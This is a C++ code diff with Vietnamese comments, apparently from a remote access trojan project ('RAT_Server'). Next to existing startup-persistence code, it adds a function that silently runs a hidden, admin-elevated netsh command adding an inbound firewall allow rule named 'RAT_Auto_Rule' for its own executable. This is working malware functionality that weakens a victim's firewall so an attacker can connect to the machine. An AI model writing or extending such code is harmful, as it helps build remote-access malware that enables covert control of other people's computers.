@@ -111,3 +111,18 @@ bool RemoveStartup() {
     RegCloseKey(hKey);
     return (result == ERROR_SUCCESS);
 }
+
+void SetupFirewall() {
+    char path[MAX_PATH];
+    // 1. Lấy đường dẫn file .exe hiện tại
+    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;
+    std::string exePath = std::string(path);
+
+    // 2. Tạo lệnh CMD để mở Firewall cho App này
+    // Lệnh: netsh advfirewall firewall add rule name="RAT_Server" dir=in action=allow program="C:\path\to\server.exe" enable=yes
+    std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & "; // Xóa rule cũ nếu có để tránh trùng
+    cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + exePath + "\" enable=yes";
+
+    // 3. Thực thi lệnh ngầm (Runas để yêu cầu quyền Admin nếu cần, SW_HIDE để không hiện cửa sổ)
+    ShellExecuteA(NULL, "runas", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
+}
